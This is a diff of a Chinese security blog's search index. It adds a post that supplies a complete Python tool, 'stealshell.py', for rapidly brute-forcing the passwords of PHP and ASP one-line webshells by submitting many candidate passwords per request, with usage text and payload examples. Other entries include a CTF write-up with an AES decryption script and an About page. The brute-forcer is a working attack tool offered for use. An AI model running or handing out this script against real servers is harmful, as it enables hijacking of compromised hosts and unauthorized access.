@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[一句话快速爆破脚本]]></title>
+    <url>%2F2018%2F03%2F180304StealShell%2F</url>
+    <content type="text"><![CDATA[思路来自爱春秋文章python之提速千倍爆破一句话 ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。 速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。 思路举例1234慢速：http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);快速：http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);&amp;findneo=echo(%22pwd:findneo%22); 用法12345678910Usage: stealshell.py [options]Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. "http://127.0.0.1/xiao.php") -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. "shell_pass_dic.txt") -n NUM the number of passwords that will be submitted in each request (219 is default) 依赖库 python2.7: requests,sys,getopt 效果如图 代码支持PHP和asp，asp部分没有搭环境测试，但只是payload简单替换，理论上是没有问题的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import requests as reqimport sysimport getopttoken="pwd"def usage(): print """################################################################################################### This is a script used to guess the pass of webshells rapidly (up to 40M each time). It supports php&amp;asp,GET&amp;POST. site: https://findneo.github.io/stealshell/###################################################################################################Usage: stealshell.py [options]Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. "http://127.0.0.1/xiao.php") -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. "shell_pass_dic.txt") -n NUM the number of passwords that will be submitted in each request (219 is default) """def get_dict(dic_name="shell_pass_dic.txt",pcpt=4,shell_type="php"): with open(dic_name,'r') as f: c=f.readlines() print "\nthis dict has %d items in all"%len(c) cnt=len(c)/pcpt # pcpt is short for password_check_per_time sp=[] # split password by pcpt per group sp.extend([c[i*pcpt:i*pcpt+pcpt] for i in xrange(cnt)]) sp+=[c[cnt*pcpt:]] # sp: [['x\n', 'cmd\n', 'pass\n', 'pwd\n'], ['xiao\n', '584521\n', 'nohack\n', '45189946\n'], ...] print "we split it into %d groups (%d * %d + %d) and submit one group each time\n"%(len(sp),cnt,pcpt,len(c)-pcpt*cnt) spd=[] execute="echo" if shell_type=="php" else "response.write" spd.extend([&#123;j.strip('\n'):"%s('%s:%s');"%(execute,token,j) for j in i&#125;for i in sp]) # spd: [&#123;'x': "echo('pwd:x\n');", 'pass': "echo('pwd:pass\n');",...] return spddef check_pass(url,pwd_list,method): for i in pwd_list: r=req.get(url,params=i) if method=="GET" else req.post(url,data=i) print '.', if token in r.content: print "" return r.contentif __name__ == '__main__': try: options,left_args=getopt.getopt(sys.argv[1:],"hu:m:d:n:",["help","url="]) except Exception as e: raise e url="http://127.0.0.1/xiao.php" method="GET" dic_name="shell_pass_dic.txt" pass_num=219 if not len(options): exit(usage()) for name,value in options: if name in ("-h","--help"): exit(usage()) elif name in ("-u","--url"): url=value elif name in ("-m"): method=value elif name in ("-d"): dic_name=value elif name in ("-n"): pass_num=int(value) shell_type=url[-3:] pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type) print check_pass(url=url,pwd_list=pwd_list,method=method)]]></content>
+      <categories>
+        <category>奇技淫巧</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[“华为杯”极客出发XMan冬令营线上CTF解题赛]]></title>
     <url>%2F2018%2F01%2Fxctf20180106%2F</url>
     <content type="text"><![CDATA[中二的成长之路 我用真心对你，你却用QR敷衍我。 附件下载 试试QR的哈希，并且注意红字。 使用图片显示的某些信息做哈希 再次观察图片，看看不一样的颜色和字体，也许需要做一下哈希 扫描题目给的图片得到3ukka4wZf2Q9H8PEI5YKFA== ，但直接base64解码得到乱码。谷歌搜索发现可能性很多，各种尝试无果。 使用binwalk分离出压缩包。不是伪加密，爆破也无果。 经过主办方提示看看不一样的颜色和字体 注意到AES，搜索发现与今年9月份的问鼎杯CTF一道题极为相似，就是压缩包的密码经过AES加密后再进行base64编码。这样就有了基本的思路。但还缺少一些信息，比如AES采用哪种模式，key是什么，如果有IV，又会是什么。 对着三次关于哈希 的提示，猜想做出来的哈希就是key，那么就不需要IV，那么就可能是ECB或CTR模式。但哈希是对谁做的呢，产生了很多联想，做了一些尝试无果。后来猛然发现，基本上能用来产生哈希用于AES加密并产生BASE64串的东西一定是在图片生成之前就存在。那么可能性就不多了，甚至没有了。比赛快结束前注意到试试QR的哈希 这一提示，不报什么希望地试了下字符串”QR”的哈希，没想到成了。解密后得到压缩包密码1Znmpr4jzChwxXqB 。 打开压缩包后迎面而来又一张QR，解出bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so= 。很容易想到这是要故技重施，又要找一串key。因为key可能是16、24或32字节，很自然想到上一次解密就试过的16个字节的文件名s776051080zum92N ，一试便成，得到XCTF{W0W_U_G0T_TH3_FL4G} 。 勉强拿到门票，即将和大佬们一起学习，有点兴奋：） 附上解题脚本： 123456789101112131415161718192021#coding:utf-8import base64,hashlibfrom Crypto.Cipher import AESkey = hashlib.md5('QR').hexdigest()secret="3ukka4wZf2Q9H8PEI5YKFA==" # 图片扫码结果def decrypt(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc)res=decrypt(base64.b64decode(secret))print len(res),res#-------------------------------------------key = "s776051080zum92N" #压缩包里面图片的文件名secret="bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=" #压缩包里图片是涨二维码，扫出来这个def decrypt2(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc)res=decrypt2(base64.b64decode(secret))print len(res),res#------运行结果--------------#16 1Znmpr4jzChwxXqB#32 XCTF&#123;W0W_U_G0T_TH3_FL4G&#125;]]></content>
@@ -41,8 +52,8 @@
         <category>writeup</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>命令注入</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -162,7 +173,7 @@
   <entry>
     <title><![CDATA[About]]></title>
     <url>%2Fabout%2Findex.html</url>
-    <content type="text"><![CDATA[本博客于2017年国庆前后上线，用以记录与分享所学所思。 XMU 2015级本科在读 WECHAT dlgbyhll EMAIL dfindneo#gmail.com Tiny jobs IP地址混淆器 即时编解码工具 为 MD 生成 TOC links My Github Ph0en1x ctf team Chybeta Vancir lzhtiny Mads]]></content>
+    <content type="text"><![CDATA[本博客于2017年国庆前后上线，用以记录与分享所学所思。 XMU 2015级本科在读 WECHAT dlgbyhll EMAIL dfindneo#gmail.com Tiny jobs IP地址混淆器 即时编解码工具 为 MD 生成 TOC 快速爆破一句话 links My Github Ph0en1x ctf team Chybeta Vancir lzhtiny Mads]]></content>
   </entry>
   <entry>
     <title><![CDATA[categories]]></title>
